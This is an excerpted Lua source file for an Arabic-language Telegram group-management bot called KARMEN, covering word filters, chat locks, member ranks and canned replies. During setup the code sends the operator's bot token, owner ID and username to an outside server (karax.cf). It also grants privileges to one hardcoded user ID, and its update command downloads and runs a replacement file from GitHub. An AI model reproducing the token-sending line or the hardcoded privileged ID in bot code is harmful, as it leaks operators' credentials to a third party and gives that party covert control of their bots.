...
https.request('http://karax.cf/KARMEN/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("KARMEN", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/KARMEN
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./KARMEN.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("RUN", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S KARMEN -X kill
screen -S KARMEN ./KARMEN
done
]])  
file:close() 
...
if tonumber(user_id) == tonumber(679199185) then  
var = true  
...
local KARMEN_Msg = ''  
if msgs < 100 then 
KARMEN_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
KARMEN_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
KARMEN_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
KARMEN_Msg = 'متفاعل' 
elseif msgs < 1200 then 
KARMEN_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
KARMEN_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
KARMEN_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
KARMEN_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
KARMEN_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
KARMEN_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
KARMEN_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
KARMEN_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
KARMEN_Msg = 'رب التفاعل'  
end 
return KARMEN_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceKARMEN(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,KARMEN_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf KARMEN.lua')
os.execute('wget https://raw.githubusercontent.com/KARMENTEAM/KARMEN/master/KARMEN.lua')
send(msg.chat_id_, msg.id_,'⌯︙تم تحديث السورس \n⌯︙لديك اخر اصدار لسورس كارمن\n⌯︙الاصدار ← { 1.2v}')
dofile('KARMEN.lua')  
end
if text == 'الاصدار ⌯' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'⌯︙اصدار سورس كارمن \n⌯︙الاصدار ←{ 1.2v}')
end
...
send(msg.chat_id_, msg.id_,'⌯︙عدد المجموعات الان » { '..#group..' }'..KARMENk..''..KARMEN..'\n*⌯︙الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')
end
end
end,nil)
end
...
usertext = '\n⌯︙العضو » ['..result.title_..'](t.me/'..(username or 'K3RMEN')..')'
status  = '\n⌯︙تم ترقيته مطور'
...
usertext = '\n⌯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'K3RMEN')..')'
status  = '\n⌯︙تم ترقيته مطور'
...
local KARMEN1_Msg = database:get(bot_id.."KARMEN1:Add:Filter:Rp2"..text..msg.chat_id_)   
if KARMEN1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌯︙العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'K3RMEN')..') \n⌯︙'..KARMEN1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if KARMEN_Msg and not Special(msg) then  
local KARMEN_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if KARMEN_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌯︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌯︙["..KARMEN_Msg.."] \n")
else
send(msg.chat_id_,0,"⌯︙العضو : {["..data.first_name_.."](T.ME/K3RMEN)}\n⌯︙["..KARMEN_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⌯︙عذرا » {["..data.first_name_.."](T.ME/K3RMEN)}\n⌯︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
📁┇[𝘍𝘐𝘓𝘌𝘚 𝘒𝘈𝘙𝘔𝘌𝘕](t.me/FILE_KARMEN) 

🎵┇[𝘔𝘜𝘚𝘐𝘊](t.me/MUSCNA) 

📋┇[𝘋𝘌𝘝 𝘚𝘖𝘜𝘙𝘊𝘌#1](t.me/k2k_k)

📧┇[𝘛𝘞𝘚 𝘚𝘖𝘜𝘙𝘊𝘌](t.me/SORS_1BOT) 
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'⌯︙بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'K3RMEN')..') \n⌯︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌯︙بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'K3RMEN')..') \n⌯︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if Get_info then
local TextS = "\n⌯︙اهلا بك في متجر ملفات كارمن\n⌯︙ملفات السورس ↓\n… … … … … … … … … … …\n\n"
local TextE = "\n… … … … … … … … … … …\n⌯︙علامة تعني { ✓ } ملف مفعل\n⌯︙علامة تعني { ✘ } ملف معطل\n⌯︙قناة سورس كارمن ↓\n".."⌯︙[اضغط هنا لدخول](t.me/K3RMEN) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_,"⌯︙عذرا الملف لايدعم سورس كارمن \n") 
end
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌯︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'K3RMEN')..')'
status  = '\n⌯︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌯︙العضو » '..userid..''
...
database:set(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"⌯︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."KARMEN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."KARMEN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"⌯︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."KARMEN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."KARMEN1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."KARMEN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"⌯︙ارسل الكلمه الان")  
database:set(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."KARMEN1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."KARMEN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."KARMEN1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."KARMEN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."KARMEN1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."KARMEN1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⌯︙قائمة المنع \n… … … … … … … … … … …\n"
for k,v in pairs(list) do  
local KARMEN_Msg = database:get(bot_id.."KARMEN1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..KARMEN_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'K3RMEN')..')'..'\n⌯︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'كارمن').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'كارمن')
local KARMEN_Msg = {
'اسمي مينو كول',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..KARMEN_Msg[math.random(#KARMEN_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'كارمن').." غادر" or text == 'بوت غادر' then  
...
local mod = '⌯︙عدد الادمنيه : '..data.administrator_count_..
'\n\n⌯︙عدد المطرودين : '..data.kicked_count_..
'\n\n⌯︙عدد الاعضاء : '..data.member_count_..
'\n\n⌯︙عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n⌯︙ اسم المجموعه : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, mod) 
end,nil)
end,nil)
end 
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mod,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (mod.total_count_ or 0)
...
local rdphoto = moda[math.random(#moda)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, mod.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
-- vardump(data) 
KARMENdx(msg.chat_id_, msg.id_, '⌯︙ايدي المجموعة » ( '..msg.chat_id_..' )\n⌯︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n⌯︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n⌯︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
mod = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,mod)  
...
mod = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,mod)  
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'كارمن')
...
KARMEN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(KARMEN)
...
'\n ها ولك مو جان  اسمك   '..modn..'  شكو غيرته ',
'\n شكو غيرت اسمك شسالفه ؟؟ 🤔🌞'
}
send(msg.chat_id_,msg.id_,mod[math.random(#mod)])
...
modn = '['..(database:get(bot_id.."Chen:User:Name"..msg.sender_user_id_) or '')..']'
local mod ={ 
'\n شكو غيرت معرفك  يا حلو 😹🌚',
'\n  ها ها شو غيرت معرفك 🤔😹',
'\n شكو غيرت معرفك شنو قطيت وحده جديده 😹😹🌚',
'\n شو غيرت معرفك شنو تعاركت ويه الحب ؟😹🌞',
'\n ها ولك مو جان  معرفك   '..modn..'  شكو غيرته ',
...
send(msg.chat_id_,msg.id_,mod[math.random(#ame)])
...
------------------------------------------------------------------------
local KARMENAbot = database:get(bot_id.."KARMEN1:Add:Filter:Rp2"..text..result.chat_id_)   
if KARMENAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌯︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌯︙["..KARMENAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local KARMEN1_Msg = database:get(bot_id.."KARMEN1:Add:Filter:Rp2"..text..result.chat_id_)   
if KARMEN1_Msg then    
send(msg.chat_id_, msg.id_,"⌯︙"..KARMEN1_Msg)
